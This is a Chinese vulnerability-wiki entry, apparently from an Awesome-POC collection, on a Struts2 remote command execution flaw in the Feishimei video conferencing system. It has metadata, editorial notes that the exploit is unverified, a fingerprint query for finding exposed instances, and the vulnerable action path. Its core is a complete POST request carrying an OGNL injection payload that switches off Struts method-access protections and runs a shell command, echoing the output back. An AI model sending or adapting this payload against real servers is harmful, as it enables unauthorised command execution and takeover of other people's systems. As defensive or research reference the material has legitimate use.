---
version: "unknown；原文“漏洞影响”处仅写飞视美视频会议系统，未列产品版本或受影响 Struts 范围"
source: "Threekiii/Awesome-POC"
title: "飞视美 视频会议系统 Struts2 远程命令执行漏洞"
product: "飞视美视频会议系统（Struts2）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "受影响Struts参数处理、业务action可达；ipconfig为Windows示例"
affected_versions: "unknown；原文“漏洞影响”处仅写飞视美视频会议系统，未列产品版本或受影响 Struts 范围"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-ffeed90fb297904d8674035f"
entity_id: "ve-43c5312d2df6dc9f56a2ebe4"
schema_version: "1"
canonical: "Web安全/商业软件/飞视美/飞视美-视频会议系统-Struts2-远程命令执行漏洞.md"
relation_type: "duplicate_of"
previous_version: "飞视美 视频会议系统"
previous_affected_versions: "飞视美 视频会议系统"
---

# 飞视美 视频会议系统 Struts2 远程命令执行漏洞

> 版本字段校订（2026-10-04）：代码、命令、路径、产品名或章节标记误入版本字段的值已逐字保存到对应 `previous_*` 字段；当前版本字段只记正文明确的来源范围，无范围时记为 unknown。后文对此元数据误填的旧说明描述校订前状态，其余实验条件与待核项仍按原文保留。

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：受影响Struts参数处理、业务action可达；ipconfig为Windows示例
- 证据范围：给出具体业务路径和八进制表达式，需独立产品版本证据；不应当通用Struts条目。

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- version字段仅产品名，未提供任何版本边界
- Host为空、HTTP长度硬编码；readFully强制51020字节可能EOF异常导致无回显
- 无鉴权状态/响应文本/来源/修复，截图未视检
- 建议主归飞视美产品并用Struts依赖关联，不能与同payload的其他产品直接删重

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## 漏洞描述

飞视美 视频会议系统 Struts2组件存在远程命令执行漏洞，通过漏洞攻击者可执行任意命令获取服务器权限

## 漏洞影响

```
飞视美 视频会议系统
```

## 网络测绘

```
app="飞视美-视频会议系统"
```

## 漏洞复现

登录页面

![image-20220525152447274](./.resource/飞视美视频会议系统Struts2远程命令执行漏洞/media/202205251524392.png)

存在漏洞的路径为

```
/confinfoaction!showallConfinfos.action
```

发送请求包

```http
POST /confinfoaction!showallConfinfos.action HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 669
Host: 
Connection: Keep-Alive

('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'ipconfig\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))
```

![image-20220525152728933](./.resource/飞视美视频会议系统Struts2远程命令执行漏洞/media/202205251527012.png)


---

> 来源：Threekiii/Awesome-POC
